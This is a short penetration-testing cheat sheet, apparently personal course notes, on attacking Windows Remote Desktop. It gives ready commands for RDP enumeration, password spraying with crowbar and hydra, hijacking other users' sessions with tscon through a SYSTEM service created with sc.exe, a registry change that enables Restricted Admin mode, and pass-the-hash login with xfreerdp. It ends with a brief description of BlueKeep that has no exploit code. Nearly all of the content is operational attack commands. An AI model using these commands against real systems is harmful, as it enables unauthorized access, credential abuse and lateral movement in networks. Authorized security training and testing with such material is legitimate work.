## Attacking RDP
```bash
# enum
nmap -Pn -A -p3389 <ip> 

# Misconfigurations
## Password Spraying
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp

# RDP Login
rdesktop -u admin -p password123 192.168.2.143
xfreerdp /v:<ip> /u:<user> /p:<pasword> /dynamic-resolution 
--------------------------------------------------------------------------------
# Protocol Specific Attacks

## RDP Session Hijacking
  # if we have rdp access with lcoal administrator priv we can hijaking the user rdp session that connect to rdp 
  # in AD this can resulte in us taking the domain admin account or Lateral movement to other account

  # if we have SYSTEM priv:
    query user #=> USERNAME SESSIONNAME ID 
    tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME} #=> open new console with the user id priv
  # if we have local administrator priv
  query user #=> USERNAME SESSIONNAME ID
  sc.exe create <new-service-name> binpath= "cmd.exe /k tscon <session-id> /dest:<session-name>" #=> ceart new service name that run the command with system priv
  net start sessionhijack #=> start the service will open new console with the id user priv

## RDP Pass-the-Hash
[!] # add and enable DisableRestrictedAdmin (need admin priv or Registry Editor Admin priv)
  reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f 

xfreerdp /v:192.168.220.152 /u:lewen /pth:<NTLM-hash> 
```

## Latest RDP Vulnerabilities
```bash
# CVE-2019-0708 - RCE (BlueKeep)
Affects:  Win XP, 7, Server 2003, 2008/R2
# Bug in RDP, allows unauth RCE
# Wormable, no user interaction
# Attack: Sends crafted RDP packets triggering heap overflow, allowing code execution
# Patch: KB4499180 (May 2019)
```

